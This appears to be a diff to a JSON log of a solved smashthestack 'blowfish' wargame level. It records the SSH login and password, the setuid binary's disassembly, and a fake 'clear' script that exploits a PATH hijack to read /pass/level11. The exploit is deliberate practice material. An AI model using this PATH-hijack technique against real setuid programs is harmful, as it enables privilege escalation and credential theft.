@@ -2009,12 +2009,61 @@
   {
    "lvl": 10,
    "user": "level10",
-   "pw": "error:U_sux0rZ",
+   "pw": "phj33r_tuX",
    "steps": [
     {
      "cmd": "ssh -p 2222 level10@blowfish.smashthestack.org",
      "out": [
-      "level10@blowfish ~ $ "
+      "level10@blowfish.smashthestack.org's password:",
+      "",
+      "   _        __                          ___              __",
+      "",
+      " /\\ \\     /\\_ \\                       /'___\\ __         /\\ \\",
+      "",
+      " \\ \\ \\____\\//\\ \\     ___   __  __  __/\\ \\__//\\_\\    ____\\ \\ \\___",
+      "",
+      "  \\ \\ '__`\\ \\ \\ \\   / __`\\/\\ \\/\\ \\/\\ \\ \\  __\\/\\ \\  /' __\\\\ \\  _ `\\",
+      "",
+      "   \\ \\ \\_\\ \\ \\_\\ \\_/\\ \\_\\_\\ \\ \\_/ \\_/ \\ \\ \\_/\\ \\ \\/\\__  `\\\\ \\ \\ \\ \\",
+      "",
+      "    \\ \\____/ /\\____\\ \\____/\\ \\___x___/'\\ \\_\\  \\ \\_\\/\\____/ \\ \\_\\ \\_\\",
+      "",
+      "     \\/___/  \\/____/\\/___/  \\/__//__/   \\/_/   \\/_/\\/___/   \\/_/\\/_/",
+      "",
+      "     wargame ++ smashthestack.org ++ now in version 2.0",
+      "",
+      "   ",
+      "",
+      "     1. Thou shalt NOT root or otherwise harm the box.",
+      "",
+      "     2. Thou shalt NOT do any network access from this box.",
+      "",
+      "     3. Thou shalt NOT use /tmp, /levels/tmp or /var/tmp for personal code.",
+      "",
+      "     4. Thou shalt give the root pass to l3thal if you manage to change it.",
+      "",
+      "     Passwords are in /pass.",
+      "",
+      "     There is a README in each users home directory.",
+      "",
+      "     /tmp && /var/tmp will be flushed daily by cron.",
+      "",
+      "     Use /code plz for umm, code ;D",
+      "",
+      "     IF YOU LEAVE FILES IN /levels/tmp U SUCK ..plz remove them kthnx! ;D",
+      "",
+      "     The password for the last level will get you into",
+      "",
+      "     Tux, the more advanced wargame. Join #blowfish on",
+      "",
+      "     irc.smashthestack.org with any questions.",
+      "",
+      "",
+      "",
+      "     Admin - s0ttle@smashthestack.org",
+      "",
+      " You're on your own. Good luck!",
+      ""
      ]
     },
     {
@@ -2032,14 +2081,54 @@
     {
      "cmd": "objdump -d /levels/level10 --start-address=0x8048524 --stop-address=0x80485e0",
      "out": [
+      "/levels/level10:     file format elf32-i386",
+      "Disassembly of section .init:",
+      "Disassembly of section .plt:",
+      "Disassembly of section .text:",
+      "08048524 <main>:",
+      " 8048524:\t55                   \tpush   %ebp",
+      " 8048525:\t89 e5                \tmov    %esp,%ebp",
+      " 8048527:\t81 ec a8 00 00 00    \tsub    $0xa8,%esp",
+      " 804852d:\t83 e4 f0             \tand    $0xfffffff0,%esp",
+      " 8048530:\tb8 00 00 00 00       \tmov    $0x0,%eax",
+      " 8048535:\t29 c4                \tsub    %eax,%esp",
+      " 8048537:\tc7 85 74 ff ff ff 20 \tmovl   $0x8048720,-0x8c(%ebp)",
+      " 804853e:\t87 04 08",
       " 8048541:\te8 02 ff ff ff       \tcall   8048448 <geteuid@plt>",
+      " 8048546:\t89 04 24             \tmov    %eax,(%esp)",
       " 8048549:\te8 ea fe ff ff       \tcall   8048438 <setuid@plt>",
+      " 804854e:\tc7 04 24 2f 87 04 08 \tmovl   $0x804872f,(%esp)",
       " 8048555:\te8 7e fe ff ff       \tcall   80483d8 <system@plt>",
+      " 804855a:\tc7 04 24 40 87 04 08 \tmovl   $0x8048740,(%esp)",
+      " 8048561:\te8 c2 fe ff ff       \tcall   8048428 <printf@plt>",
+      " 8048566:\ta1 c8 98 04 08       \tmov    0x80498c8,%eax",
+      " 804856b:\t89 44 24 08          \tmov    %eax,0x8(%esp)",
+      " 804856f:\tc7 44 24 04 7f 00 00 \tmovl   $0x7f,0x4(%esp)",
+      " 8048576:\t00",
+      " 8048577:\t8d 85 78 ff ff ff    \tlea    -0x88(%ebp),%eax",
+      " 804857d:\t89 04 24             \tmov    %eax,(%esp)",
       " 8048580:\te8 63 fe ff ff       \tcall   80483e8 <fgets@plt>",
+      " 8048585:\tc7 04 24 02 00 00 00 \tmovl   $0x2,(%esp)",
       " 804858c:\te8 77 fe ff ff       \tcall   8048408 <sleep@plt>",
+      " 8048591:\t8d 85 78 ff ff ff    \tlea    -0x88(%ebp),%eax",
+      " 8048597:\t89 04 24             \tmov    %eax,(%esp)",
       " 804859a:\te8 59 fe ff ff       \tcall   80483f8 <strlen@plt>",
+      " 804859f:\t83 f8 f6             \tcmp    $0xfffffff6,%eax",
+      " 80485a2:\t74 0e                \tje     80485b2 <main+0x8e>",
+      " 80485a4:\tc7 04 24 60 87 04 08 \tmovl   $0x8048760,(%esp)",
       " 80485ab:\te8 78 fe ff ff       \tcall   8048428 <printf@plt>",
-      " 80485d5:\te8 ee fd ff ff       \tcall   80483c8 <execl@plt>"
+      " 80485b0:\teb 28                \tjmp    80485da <main+0xb6>",
+      " 80485b2:\tc7 04 24 7f 87 04 08 \tmovl   $0x804877f,(%esp)",
+      " 80485b9:\te8 6a fe ff ff       \tcall   8048428 <printf@plt>",
+      " 80485be:\tc7 44 24 08 00 00 00 \tmovl   $0x0,0x8(%esp)",
+      " 80485c5:\t00",
+      " 80485c6:\tc7 44 24 04 9d 87 04 \tmovl   $0x804879d,0x4(%esp)",
+      " 80485cd:\t08",
+      " 80485ce:\tc7 04 24 a0 87 04 08 \tmovl   $0x80487a0,(%esp)",
+      " 80485d5:\te8 ee fd ff ff       \tcall   80483c8 <execl@plt>",
+      " 80485da:\tb8 00 00 00 00       \tmov    $0x0,%eax",
+      " 80485df:\tc9                   \tleave",
+      "Disassembly of section .fini:"
      ]
     },
     {
@@ -2058,37 +2147,26 @@
     },
     {
      "cmd": "mkdir /dev/shm/l10",
+     "out": []
+    },
+    {
+     "cmd": "vim /dev/shm/l10/clear",
+     "out": []
+    },
+    {
+     "cmd": "vim /dev/shm/l10/clear",
      "out": [
-      "mkdir: cannot create directory `/dev/shm/l10': File exists"
+      "1 #!/bin/sh",
+      "2 # PATH hijack: level10 calls system(\"clear\") AFTER setuid(geteuid()), so the",
+      "3 # child shell keeps euid=level11 and runs the first \"clear\" found in PATH.",
+      "4 # Put our script first on PATH and it executes as level11.",
+      "5 cat /pass/level11"
      ]
     },
     {
-     "cmd": "vi /dev/shm/l10/clear",
+     "cmd": "vim /dev/shm/l10/clear",
      "out": [
-      "",
-      "~"
-     ]
-    },
-    {
-     "cmd": "vi /dev/shm/l10/clear",
-     "out": [
-      "#!/bin/sh",
-      "# PATH hijack: level10 calls system(\"clear\") AFTER setuid(geteuid()), so the",
-      "# child shell keeps euid=level11 and runs the first \"clear\" found in PATH.",
-      "~"
-     ]
-    },
-    {
-     "cmd": "vi /dev/shm/l10/clear",
-     "out": [
-      "#!/bin/sh",
-      "# PATH hijack: level10 calls system(\"clear\") AFTER setuid(geteuid()), so the",
-      "# child shell keeps euid=level11 and runs the first \"clear\" found in PATH.",
-      "# Put our script first on PATH and it executes as level11.",
-      "cat /pass/level11",
-      "~",
-      "\"/dev/shm/l10/clear\" 6L, 240C written",
-      ""
+      "\"/dev/shm/l10/clear\" 6L, 240C written"
      ]
     },
     {
@@ -2105,7 +2183,12 @@
     },
     {
      "cmd": "exit",
-     "out": []
+     "out": [
+      "logout",
+      "Connection to blowfish.smashthestack.org closed.",
+      "client$ exit",
+      "exit"
+     ]
     }
    ],
    "note": "PATH hijack on system(\"clear\"). The binary calls setuid(geteuid()) then system(\"clear\") before the password game: the clear command runs through sh -c with PATH under our control, and the child keeps euid=level11. We put a script named 'clear' (cat /pass/level11) first on PATH; the game itself always fails (strlen never equals the magic compare), but by then our clear has already printed the level11 password. Verified live 2026-11-25: phj33r_tuX, level11 login confirmed."
